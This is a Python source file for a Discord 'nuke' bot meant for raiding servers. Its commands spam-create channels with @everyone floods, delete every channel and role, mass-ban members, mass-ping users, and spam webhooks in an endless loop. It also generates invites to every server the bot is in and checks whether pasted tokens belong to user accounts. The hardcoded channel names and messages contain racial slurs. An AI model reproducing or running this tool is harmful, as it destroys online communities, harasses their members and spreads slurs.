import discord
import asyncio
import requests
import time
import random
from discord.ext import commands




# ================ multifunction discord bot (or just nuke) ================ # 
# ++++++++++++++++          started at 10/17/2023           ++++++++++++++++ #







                # ================ to do list ================ # 
                # add multiple channel names and message content for customflush
                # fix mass ban
                # fix profile spy
                # add message deletion spy
                # add animation effect for webhook spammer discord message with edit
                # add await ctx.message.add_reaction("✔️") to every command
                # ================ to do list ================ # 




# Replace TOKEN with your Discord bot token
# Put your user ID inside YOURUSERID
TOKEN = ''
YOURUSERID = ''
PREFIX = '!'

intents = discord.Intents.all()


bot = commands.Bot(command_prefix=PREFIX, intents=intents)


bot.remove_command('help')

def check_token_type(token):
    headers = {
        'Authorization': token
    }
    response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
    
    if response.status_code == 200:
        data = response.json()
        if 'bot' in data:
            return 'Bot'
        else:
            return 'Account'
    else:
        return 'Invalid/Bot'



@bot.event
async def on_ready():
    user = await bot.fetch_user(YOURUSERID)
    await bot.change_presence(status=discord.Status.do_not_disturb)
    await user.send("Bot ready. Developed by <@992952207588720730>")
    game = discord.Game(f"{PREFIX}help")
    await bot.change_presence(activity=game)
    print(f'Logged in as {bot.user.name}')



@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.reply(f"Invalid command.\n`{PREFIX}help`")


# goofy spy #
# ========================================================================= #

userprofilespy = "OFF"
banspy = "OFF"

@bot.event
async def on_member_update(before, after):
    global userprofilespy

    if userprofilespy != "OFF":
        guild = after.guild
        channel = discord.utils.get(guild.text_channels, name='spy')

        userbefore = before.name
        userafter = after.name

        

        avbefore = before.avatar.url if before.avatar else None
        avafter = after.avatar.url if after.avatar else None

        beforedis = before.display_name
        afterdis = after.display_name

        embed = discord.Embed(title="Spy", description="Profile change detected.", color=discord.Color.dark_green())
        embed.add_field(name="Username before:", value=f"{userbefore}", inline=False)
        embed.add_field(name="Username after:", value=f"{userafter}", inline=False)
        embed.add_field(name="Display name before:", value=f"{beforedis}", inline=False)
        embed.add_field(name="Display name after:", value=f"{afterdis}", inline=False)

        
        embedtwo = discord.Embed(title="Avatar before:", description="", color=discord.Color.dark_green())
        embedtwo.set_image(url=avbefore)

        embedthree = discord.Embed(title="Avatar after:", description="", color=discord.Color.dark_green())
        embedthree.set_image(url=avafter)

        await channel.send(embed=embed)
        await channel.send(embed=embedtwo)
        await channel.send(embed=embedthree)
        

@bot.event
async def on_member_ban(guild, user):
    channel = discord.utils.get(guild.text_channels, name='spy')
    global banspy

    if banspy != "OFF":
        avatar_url = user.avatar.url if user.avatar else user.default_avatar.url
        embed = discord.Embed(title="User banned", description=f"**{user}** was banned in {guild}.", color=discord.Color.red())
        embed.set_image(url=f"{avatar_url}")
        await channel.send(embed=embed)




@bot.command()
async def profilespytoggle(ctx, mode: str):
    global userprofilespy
    if mode.lower() == "on":
        userprofilespy = "ON"
        await ctx.reply("Profile spy set to on.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
    elif mode.lower() == "off":
        userprofilespy = "OFF"
        await ctx.reply("Profile spy set to off.")
    else:
        await ctx.reply("Invalid syntax.")

@bot.command()
async def banspytoggle(ctx, mode: str):
    global banspy
    if mode.lower() == "on":
        banspy = "ON"
        await ctx.reply("Ban spy set to on.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
    elif mode.lower() == "off":
        banspy = "OFF"
        await ctx.reply("Ban spy set to off.")
    else:
        await ctx.reply("Invalid syntax.")



# goofy spy #
# ========================================================================= #




@bot.command()
async def setstatus(ctx, status: str):
    if ctx.author.id != int(YOURUSERID):
        await ctx.reply('You are not authorized to use this command.')
        return

    if status.lower() == 'online':
        await bot.change_presence(status=discord.Status.online)
        await ctx.reply('Done.')
    elif status.lower() == 'idle':
        await bot.change_presence(status=discord.Status.idle)
        await ctx.reply('Done.')
    elif status.lower() == 'dnd' or status.lower() == 'do not disturb':
        await bot.change_presence(status=discord.Status.dnd)
        await ctx.reply('Done.')
    elif status.lower() == 'invisible':
        await bot.change_presence(status=discord.Status.invisible)
        await ctx.reply('Done.')
    else:
        await ctx.reply('Invalid status. Please choose one of the following: online, idle, dnd, invisible')


@bot.command()
async def flush(ctx, server_id):
    try:
        channel_names = ["NUKED NIGGAS", "get fucked", "RAIDED", "GET SHITTED ON"]
        message_contents = ["@everyone GET NUKED 🤡", "@everyone RAIDED", "@everyone speak your shit lil niggas", "@everyone FLOP"]
        guild = bot.get_guild(int(server_id))
        if guild is not None:
            created_channels = []
            channel_amount = 20
            message_amount = 30

            for _ in range(channel_amount):
                new_channel_name = new_channel_name = random.choice(channel_names)
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                    guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                }
                new_channel = await guild.create_text_channel(new_channel_name, overwrites=overwrites)
                created_channels.append(new_channel)

            tasks = []
            for channel in created_channels:
                message_content = random.choice(message_contents)
                task = asyncio.create_task(send_messages(channel, message_amount, message_content))
                tasks.append(task)

            await asyncio.gather(*tasks)

            
        else:
            await ctx.send(f'Could not find the server with ID "{server_id}"')
    except ValueError:
        await ctx.send("Invalid syntax.")



@bot.command()
async def customflush(ctx, server_id, channel_amount, channel_name, message_amount, *, message_content):
    try:
        guild = bot.get_guild(int(server_id))
        if guild is not None:
            created_channels = []
            for _ in range(int(channel_amount)):
                new_channel_name = channel_name.strip()
                existing_channel = discord.utils.get(guild.channels, name=new_channel_name)
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                    guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                }
                new_channel = await guild.create_text_channel(new_channel_name, overwrites=overwrites)
                created_channels.append(new_channel)

            tasks = []
            for channel in created_channels:
                task = asyncio.create_task(send_messages(channel, int(message_amount), message_content))
                tasks.append(task)

            await asyncio.gather(*tasks)

            await ctx.send("Operation complete.")
        else:
            await ctx.send(f'Could not find the server with ID "{server_id}"')
    except ValueError:
        await ctx.send("Invalid syntax.")
        
@bot.command()
async def purge(ctx, server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild is not None:
            for channel in guild.channels:
                await channel.delete()
            await ctx.send("All channels have been deleted.")
        else:
            await ctx.send(f'Could not find the server with ID "{server_id}"')
    except ValueError:
        await ctx.reply("Invalid input. Please try again.")


@bot.command()
async def help(ctx):
    help_embed = discord.Embed(title='Bithub [ALPHA] V0.01', color=discord.Color.blue())
    help_embed.add_field(name='', value='Nuke ☢️', inline=False)
    help_embed.add_field(name='', value='Utility 🛠️', inline=False)
    help_embed.add_field(name='', value='Spy 👁️', inline=False)
    help_embed.set_footer(text="Made by xolo. | Started at 10/17/2023.")
    view = XOLOVIEW()
    await ctx.reply(embed=help_embed, view=view)

@bot.command()
async def leave(ctx, server_id):
    guild = bot.get_guild(int(server_id))
    if guild is not None:
        guildname = guild.name
        await guild.leave()
        await ctx.send(f"Successfully left the server **{guildname}**.")
    else:
        await ctx.send(f"Could not find the server with ID {server_id}.")

@bot.command()
async def link(ctx):
    
    await ctx.message.add_reaction("✔️")

    await ctx.reply("https://discord.com/api/oauth2/authorize?client_id=999232775443984495&permissions=8&scope=bot")


@bot.command()
async def servlist(ctx):
    servers = bot.guilds
    server_list = ""
    for server in servers:
        text_channels = server.text_channels
        if text_channels:
            invite = await text_channels[0].create_invite()
            permissions = server.me.guild_permissions
            if permissions.administrator:
                permission_string = "Yes"
            else:
                permission_string = "No"
            server_info = f"**{server.name}** (ID: {server.id})\nInvite: {invite.url}\nHas Admin: {permission_string}\n============================\n"
            server_list += server_info
    await ctx.send(f"Server list:\n{server_list}")

@bot.command()
async def massping(ctx, server_id: int, message_amount: int = 5, *, message_content: str = "Sup niggas"):
    guild = bot.get_guild(server_id)
    if guild is None:
        await ctx.send("Invalid server ID.")
        return

    members = guild.members[:50]  # Fetch up to 50 members
    mentions = ' '.join(member.mention for member in members)

    tasks = []
    for channel in guild.text_channels:
        for _ in range(message_amount):
            tasks.append(channel.send(f"{mentions} {message_content}"))

    await asyncio.gather(*tasks)

    await ctx.message.add_reaction("✔️")
    

@bot.command()
async def clear(ctx, server_id: int):
    guild = bot.get_guild(server_id)
    if guild is None:
        await ctx.send("Invalid server ID.")
        return

    def is_bot_message(message):
        return message.author == bot.user

    deleted_count = 0
    for channel in guild.text_channels:
        async for message in channel.history(limit=None):
            if is_bot_message(message):
                await message.delete()
                deleted_count += 1

    await ctx.message.add_reaction("✔️")
    await ctx.send(f"Deleted {deleted_count} message(s) sent by the bot.")


@bot.command()
async def clearchannel(ctx, server_id: int, channel_id: int):
    try:
        guild = bot.get_guild(server_id)
        channel = guild.get_channel(channel_id)

        if not channel:
            await ctx.send(f"Channel with ID {channel_id} not found.")
            return

        await channel.purge()
        await ctx.send(f"All messages in channel **{channel.name}** have been deleted.")
    except:
        pass


@bot.command()
async def rolepurge(ctx, server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild is None:
            await ctx.send("Invalid server ID or bot is not a member of the server.")
            return

        roles = guild.roles
        bot_role = guild.get_member(bot.user.id).top_role

        for role in roles:
            if role.name != "@everyone" and role != bot_role:
                await role.delete()
        
        await ctx.send("All deletable roles have been deleted.")
    except discord.errors.Forbidden:
        await ctx.send("Insufficient permissions to delete roles.")
    except ValueError:
        await ctx.send("Invalid server ID format.")

@bot.command()
async def tokentype(ctx, token):
    if check_token_type(token) == 'Account':
        await ctx.send("Account token.")
    else:
        await ctx.send("Bot/Invalid.")
    
    
@bot.command()
async def say(ctx, *args):
    message = " ".join(args)
    await ctx.message.delete() 
    await ctx.send(message)

@bot.command()
async def ban(ctx, user_id: int, *, reason="No reason provided."):
    try:
        user = await bot.fetch_user(user_id)
        await user.send(f'You have been banned from {ctx.guild.name}.\nReason: **{reason}**')
        await ctx.guild.ban(user, reason=reason)
        await ctx.send(f'Successfully banned user with ID: {user_id}.\nReason: **{reason}**')
    
    except discord.NotFound:
        await ctx.send('User not found/Failed.')

@bot.command()
async def unban(ctx, id: int):
    user = await bot.fetch_user(id)
    try:
        await ctx.guild.unban(user)
        await ctx.send(f'Unbanned **{user.name}**')
    except:
        await ctx.send('Failed.')


@bot.command()
async def massban(ctx):
    guild = ctx.guild
    members = guild.members

    for member in members:
        await guild.ban(member)
        await asyncio.sleep(0.5)  # Add a delay of 0.5 seconds between each ban

    await ctx.send('Successfully banned all users.')

@bot.command()
async def dm(ctx, userid, *, messagecontent):
    user = await bot.fetch_user(userid)
    try:
        await user.send(f"{messagecontent}\n_Sent by {ctx.author.display_name}_")
        await ctx.send("Direct message sent successfully!")
    except discord.Forbidden:
        await ctx.send("Unable to send a direct message to the user.")


@bot.command()
async def webhookspam(ctx, webhook, msg):
    await ctx.reply("Spamming webhook....")
    await ctx.message.add_reaction("✔️")
    webhookfuck(webhook, msg)


@bot.command()
async def avatar(ctx, user: discord.User):
    avatar_url = user.avatar.url if user.avatar else user.default_avatar.url
    embed = discord.Embed(title=f"Dis nigga {user.name}'s avatar", description="", color=discord.Color.gold())
    embed.set_footer(text="Dis shit goofy")
    embed.set_image(url=f"{avatar_url}")
    await ctx.reply(embed=embed)



    
#                                  non bot functions                                      #

#=========================================================================================#


async def send_messages(channel, num_messages, message_content):
    for _ in range(num_messages):
        await channel.send(message_content)



# webhook spammer skidded from Rdimo hazard nuker
def webhookfuck(WebHook, Message):
    while True:
        response = requests.post(
            WebHook,
            json = {"content" : Message},
            params = {'wait' : True}
        )
        try:
            
            if response.status_code == 204 or response.status_code == 200:
                print("Sent")
            elif response.status_code == 429:
                print("rate limited")
                
                time.sleep(response.json()["retry_after"] / 1000)
            else:
                print("error")

            time.sleep(.01)
        except KeyboardInterrupt:
            break





class XOLOVIEW(discord.ui.View):
    @discord.ui.button(label="☢️",
                       style=discord.ButtonStyle.danger)
    async def nig(self, interaction: discord.Interaction, button: discord.ui.Button):
        help_embed = discord.Embed(title='Nuking', color=discord.Color.red())
        help_embed.add_field(name='Flush', value='Nukes server\n`!flush <serverid>`', inline=False)
        help_embed.add_field(name='Custom Flush', value='Creates channels and messages\n`!customflush <serverid> <channelamount> <channelname> <messageamount> <messagecontent>`\nE.g. `!customflush 1234567890 5 ExampleChannel 10 ExampleMessage`', inline=False)
        help_embed.add_field(name='Purge', value='Deletes all channels\n`!purge <serverid>`', inline=False)
        help_embed.add_field(name='Mass Ping', value='`!massping <serverid> <messageamount> <messagecontent>`', inline=False)
        help_embed.add_field(name='Clear Channel', value='Deletes all messages in a channel\n`!clearchannel <serverid> <channelid>`', inline=False)
        help_embed.add_field(name='Set Status', value='`!setstatus <status>`', inline=False)
        help_embed.add_field(name='Role Purge', value='`!rolepurge <serverid>`', inline=False)
        help_embed.add_field(name='❌ Mass Ban [BROKEN] ❌', value='`!massban <serverid>`', inline=False)
        help_embed.add_field(name='Webhook Fucker', value='`!webhookfuck <webhook> <msgcontent>`', inline=False)
        help_embed.set_footer(text="Made by xolo. | Started at 10/17/2023.")

        await interaction.response.send_message(embed=help_embed, ephemeral=True)

    @discord.ui.button(label="🛠️",
                       style=discord.ButtonStyle.green)
    async def niga(self, interaction: discord.Interaction, button: discord.ui.Button):
        helpembed = discord.Embed(title='Utilities', color=discord.Color.green())
        helpembed.add_field(name='Leave', value='Leaves the server\n`!leave <serverid>`', inline=False)
        helpembed.add_field(name='Link', value='Invite link\n`!link`', inline=False)
        helpembed.add_field(name='Server List', value='`!servlist`', inline=False)
        helpembed.add_field(name='Clear', value='Deletes all messages sent by the bot\n`!clear <serverid>`', inline=False)
        helpembed.add_field(name='Set Status', value='`!setstatus <status>`', inline=False)
        helpembed.add_field(name='Token Type', value='`!tokentype <token>`', inline=False)
        helpembed.add_field(name='Say', value='`!say <msg>`', inline=False)
        helpembed.add_field(name='Ban', value='`!ban <userid> <reason>`', inline=False)
        helpembed.add_field(name='UnBan', value='`!unban <userid>`', inline=False)
        helpembed.add_field(name='DM', value='`!dm <userid> <msgcontent>`', inline=False)
        helpembed.add_field(name='Avatar', value='`!avatar <user>`', inline=False)
        helpembed.set_footer(text="Made by xolo. | Started at 10/17/2023.")

        await interaction.response.send_message(embed=helpembed, ephemeral=True)

    @discord.ui.button(label="👁️",
                       style=discord.ButtonStyle.gray)
    async def nigaz(self, interaction: discord.Interaction, button: discord.ui.Button):
        global banspy
        global userprofilespy
        helpxembed = discord.Embed(title='Spy', color=discord.Color.greyple())
        helpxembed.add_field(name='Toggle status: ', value='`!profilespytoggle` | `!banspytoggle`', inline=False)
        helpxembed.add_field(name='❌ User profile change spy [BROKEN] ❌', value=f'Status: {userprofilespy}', inline=False)
        helpxembed.add_field(name='Ban spy', value=f'Status: {banspy} ', inline=False)
        helpxembed.set_footer(text="Made by xolo. | Started this project at 10/17/2023.")


        await interaction.response.send_message(embed=helpxembed, ephemeral=True)


        

bot.run(TOKEN)
